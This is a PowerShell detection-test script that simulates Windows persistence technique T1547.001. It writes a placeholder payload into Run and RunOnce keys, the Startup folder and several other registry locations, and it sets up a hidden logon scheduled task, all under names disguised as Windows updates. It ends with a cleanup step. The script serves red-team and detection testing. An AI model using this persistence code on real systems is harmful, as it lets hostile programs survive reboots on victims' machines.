# ============================================
# T1547.001 - Boot or Logon Autostart Execution: Registry Run Keys
# ============================================
# This script demonstrates persistence via startup locations
# Multiple techniques combined for comprehensive detection
# ============================================

Write-Host "`n[ATTACK] T1547.001 - Registry Run Keys / Startup Folder Persistence" -ForegroundColor Red
Write-Host "============================================`n" -ForegroundColor Red

Write-Host "[PHASE 1] Registry Run Key Persistence" -ForegroundColor Cyan
Write-Host "[INFO] Adding malicious entry to Run key..." -ForegroundColor Gray

# Create malicious payload (safe demo - just cmd echo)
$payloadPath = "$env:TEMP\malicious_payload.bat"
$payloadContent = @"
@echo off
echo [MALWARE] Persistence payload executed at %date% %time% >> %TEMP%\persistence_log.txt
REM In real attack, this would be C2 beacon or backdoor
"@

Set-Content -Path $payloadPath -Value $payloadContent
Write-Host "[CREATED] $payloadPath" -ForegroundColor Yellow

# Add to Run key (Current User)
$runKey = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
try {
    Set-ItemProperty -Path $runKey -Name "WindowsSecurityUpdate" -Value $payloadPath -Type String
    Write-Host "[SUCCESS] Added to HKCU\...\Run\WindowsSecurityUpdate" -ForegroundColor Green
} catch {
    Write-Host "[ERROR] Failed to add Run key: $_" -ForegroundColor Red
}

Start-Sleep -Seconds 2

Write-Host "`n[PHASE 2] RunOnce Key (Single Execution)" -ForegroundColor Cyan
Write-Host "[INFO] Adding to RunOnce for one-time execution..." -ForegroundColor Gray

$runOnceKey = "HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce"
try {
    Set-ItemProperty -Path $runOnceKey -Name "ConfigUpdate" -Value "powershell.exe -NoProfile -Command Write-Host 'RunOnce executed'" -Type String
    Write-Host "[SUCCESS] Added to RunOnce\ConfigUpdate" -ForegroundColor Green
} catch {
    Write-Host "[ERROR] Failed to add RunOnce key: $_" -ForegroundColor Red
}

Start-Sleep -Seconds 2

Write-Host "`n[PHASE 3] Startup Folder Persistence" -ForegroundColor Cyan
Write-Host "[INFO] Copying payload to Startup folder..." -ForegroundColor Gray

$startupFolder = [Environment]::GetFolderPath("Startup")
Write-Host "[PATH] $startupFolder" -ForegroundColor Gray

$startupPayload = "$startupFolder\SystemCheck.bat"
try {
    Copy-Item -Path $payloadPath -Destination $startupPayload -Force
    Write-Host "[SUCCESS] Payload copied to Startup folder" -ForegroundColor Green
} catch {
    Write-Host "[ERROR] Failed to copy to Startup: $_" -ForegroundColor Red
}

Start-Sleep -Seconds 2

Write-Host "`n[PHASE 4] Winlogon Registry Modification" -ForegroundColor Cyan
Write-Host "[INFO] Attempting Winlogon Shell modification..." -ForegroundColor Gray

# Check if running as Admin
$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

if ($isAdmin) {
    $winlogonKey = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
    
    try {
        # Backup original value
        $originalShell = (Get-ItemProperty -Path $winlogonKey -Name "Shell").Shell
        Write-Host "[BACKUP] Original Shell: $originalShell" -ForegroundColor Gray
        
        # Modify (CAREFUL - this affects system logon!)
        # For demo, we just read it instead of modifying
        Write-Host "[DEMO] Would modify Shell to: explorer.exe,$payloadPath" -ForegroundColor Magenta
        Write-Host "[SKIPPED] Actual modification disabled for safety" -ForegroundColor Yellow
        
    } catch {
        Write-Host "[ERROR] Failed to access Winlogon key: $_" -ForegroundColor Red
    }
} else {
    Write-Host "[SKIPPED] Requires Administrator privileges" -ForegroundColor Yellow
}

Start-Sleep -Seconds 2

Write-Host "`n[PHASE 5] Multiple Persistence Locations (Spray and Pray)" -ForegroundColor Cyan
Write-Host "[INFO] Adding to multiple registry locations..." -ForegroundColor Gray

$persistenceKeys = @(
    "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run",
    "HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce",
    "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders",
    "HKCU:\Environment"
)

foreach ($keyPath in $persistenceKeys) {
    if (Test-Path $keyPath) {
        try {
            $valueName = "MultiKG_$(Get-Random -Maximum 9999)"
            Set-ItemProperty -Path $keyPath -Name $valueName -Value $payloadPath -ErrorAction Stop
            Write-Host "[SUCCESS] $keyPath\$valueName" -ForegroundColor Green
        } catch {
            Write-Host "[FAILED] $keyPath" -ForegroundColor Yellow
        }
    }
}

Write-Host "`n[PHASE 6] Scheduled Task Persistence (Alternative)" -ForegroundColor Cyan
Write-Host "[INFO] Creating scheduled task for persistence..." -ForegroundColor Gray

$taskName = "WindowsUpdateCheck"
$taskAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -WindowStyle Hidden -Command `"Write-Host 'Task executed'`""
$taskTrigger = New-ScheduledTaskTrigger -AtLogOn
$taskSettings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries

try {
    Register-ScheduledTask -TaskName $taskName -Action $taskAction -Trigger $taskTrigger -Settings $taskSettings -Description "System update checker" -Force | Out-Null
    Write-Host "[SUCCESS] Scheduled task created: $taskName" -ForegroundColor Green
} catch {
    Write-Host "[ERROR] Failed to create scheduled task: $_" -ForegroundColor Red
}

Write-Host "`n[ATTACK COMPLETE]" -ForegroundColor Red
Write-Host "[PERSISTENCE MECHANISMS DEPLOYED]" -ForegroundColor Gray
Write-Host "  - Registry Run key: WindowsSecurityUpdate" -ForegroundColor Gray
Write-Host "  - Registry RunOnce key: ConfigUpdate" -ForegroundColor Gray
Write-Host "  - Startup folder: SystemCheck.bat" -ForegroundColor Gray
Write-Host "  - Multiple spray locations: $(($persistenceKeys.Count)) keys" -ForegroundColor Gray
Write-Host "  - Scheduled task: $taskName" -ForegroundColor Gray

Write-Host "`n[DETECTION SYSTEM] Should detect persistence mechanisms..." -ForegroundColor Cyan

# Cleanup prompt
Write-Host "`nPress any key to remove all persistence mechanisms..." -ForegroundColor Yellow
$null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")

Write-Host "`n[CLEANUP] Removing persistence artifacts..." -ForegroundColor Cyan

# Remove Run keys
Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsSecurityUpdate" -ErrorAction SilentlyContinue
Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce" -Name "ConfigUpdate" -ErrorAction SilentlyContinue

# Remove MultiKG spray keys
$paths = @(
    "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run",
    "HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce",
    "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders",
    "HKCU:\Environment"
)
foreach ($path in $paths) {
    if (Test-Path $path) {
        Get-ItemProperty -Path $path -ErrorAction SilentlyContinue | 
            ForEach-Object { $_.PSObject.Properties } | 
            Where-Object { $_.Name -like "MultiKG_*" } | 
            ForEach-Object { 
                Remove-ItemProperty -Path $path -Name $_.Name -ErrorAction SilentlyContinue 
            }
    }
}

# Remove Startup folder payload
Remove-Item -Path "$startupFolder\SystemCheck.bat" -Force -ErrorAction SilentlyContinue

# Remove payload
Remove-Item -Path $payloadPath -Force -ErrorAction SilentlyContinue
Remove-Item "$env:TEMP\persistence_log.txt" -Force -ErrorAction SilentlyContinue

# Remove scheduled task
Unregister-ScheduledTask -TaskName $taskName -Confirm:$false -ErrorAction SilentlyContinue

Write-Host "[SUCCESS] All persistence mechanisms removed" -ForegroundColor Green
